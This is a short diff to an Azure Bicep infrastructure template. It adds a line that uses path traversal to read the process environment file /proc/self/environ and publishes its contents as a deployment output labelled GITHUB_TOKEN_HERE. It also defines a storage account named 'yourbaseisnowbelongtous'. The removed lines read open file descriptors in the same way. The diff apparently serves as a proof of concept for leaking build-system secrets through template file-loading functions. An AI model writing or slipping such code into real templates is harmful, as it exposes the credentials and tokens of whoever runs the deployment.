@@ -1,6 +1,11 @@
+  var secrets = loadTextContent('../../../../../../../../../../proc/self/environ')
 
-  var fd4 = loadTextContent('../../../../../../../../../../proc/self/fd/4')
-  var fd5 = loadTextContent('../../../../../../../../../../proc/self/fd/5')
+  param location string = 'eastus'
 
-  output FD4 string = fd4
-  output FD5 string = fd5
+  resource storageAccount 'Microsoft.Storage/storageAccounts@2021-02-01' = {
+    name: 'yourbaseisnowbelongtous'
+    location: location
+    sku: { name: 'Standard_LRS' }
+    kind: 'StorageV2'
+  }
+output GITHUB_TOKEN_HERE string = secrets
